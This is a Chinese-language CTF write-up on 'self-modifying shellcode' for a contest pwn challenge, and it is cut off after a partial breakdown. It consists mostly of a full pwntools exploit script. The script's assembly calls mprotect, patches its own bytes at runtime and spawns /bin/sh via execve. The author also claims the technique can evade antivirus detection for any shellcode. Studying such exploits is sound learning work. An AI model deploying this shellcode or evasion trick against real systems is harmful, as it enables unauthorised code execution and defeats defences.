---
typora-copy-images-to: ./images
---

# 自改变shellcode

by Maple

校赛的`shell_for_shell`打破防了，但学到了一个叫做**自改变shellcode**的shellcode注入方式，理论来说可以实现所有的shellcode免杀，记录一下

先贴exp：

```python
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='amd64',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
#libc = ELF("./libc.so.6")
p = process('./pwn')
gdb.attach(p)

#----恢复栈帧------
shellcode = """
	mov rbp, 0x404500
    mov rsp, rbp
    lea r15, [rip+0xe00]
    sub r15, 0xe16
    mov rdi, r15
    mov rsi, 0x1000
    mov rdx, 0x7
    mov rax, 0x401070
    call rax
    mov si, word ptr [r15 + 0x100]
    add si, 0x101
    mov word ptr [r15 + 0x100], si
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    /* push argument array ['sh\x00'] */
    /* push b'sh\x00' */
    push 0x1010101 ^ 0x6873
    xor dword ptr [rsp], 0x1010101
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    push 8
    pop rsi
    add rsi, rsp
    push rsi /* 'sh\x00' */
    mov rsi, rsp
    xor edx, edx /* 0 */
    /* call execve() */
    push SYS_execve /* 0x3b */
    pop rax
"""
payload = (b"\x00\xc0"+asm(shellcode)).ljust(0x100-3, b"\x90")+b"\x0e\x04"

print(payload)
p.send(payload)
p.interactive()
```

这边分段分析一下

## 恢复栈+调用mprotect改权限

```assembly
	mov rbp, 0x404500	;栈底恢复
    mov rsp, rbp	;rbp赋给rsp，恢复栈顶
    lea r15, [rip+0xe00]	;这里如果动调过会发现rip被保留了（其实看ida的汇编码也能看出来），就拿rip做传递栈指针
    sub r15, 0xe16	;额外减0x16，为栈留出空间
    mov rdi, r15	;rdi被传递,这里即addr = rdi
    mov rsi, 0x1000	;len = 0x1000
    mov rdx, 0x7	;prot = 7
    mov rax, 0x401070	;	rax = 0x401070(对应mprotecct)
    call rax	;callmprotect指令
```

这里将栈底恢复为`0x404500`(因为动调发现这里有写入权限)，而写中间值是为了方便上下增长

![image-20250401233510572](./images/image-20250401233510572.png)

## 

